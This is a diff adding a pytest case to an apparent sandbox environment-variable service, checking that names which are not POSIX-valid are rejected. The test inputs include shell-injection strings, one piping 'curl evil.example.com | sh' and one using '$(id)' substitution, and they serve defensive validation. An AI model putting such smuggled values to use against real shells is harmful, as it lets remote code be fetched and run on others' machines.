@@ -106,6 +106,32 @@ async def test_bad_scope_shape(service):
         )
 
 
+@pytest.mark.parametrize(
+    "env_name",
+    [
+        "FOO='; curl evil.example.com | sh; X='",  # breaks out of the export
+        "FOO BAR",  # word split
+        "FOO$(id)",  # command substitution
+        "1FOO",  # not a POSIX name
+        "",
+    ],
+)
+async def test_env_name_that_is_not_a_posix_name_is_rejected(service, env_name):
+    """Names are written into the sandbox as shell code for terminal sessions, and
+    an org/workspace entry authored by an admin runs in every member's sandbox."""
+    with pytest.raises(SandboxEnvShapeError):
+        await service.create_entry(
+            env_name=env_name,
+            is_secret=False,
+            scope="org",
+            workspace_id=None,
+            user_id=None,
+            hosts=None,
+            header_names=None,
+            secret_value="v",
+        )
+
+
 async def test_bad_host_rejected(service):
     with pytest.raises(HostPatternError):
         await service.create_entry(
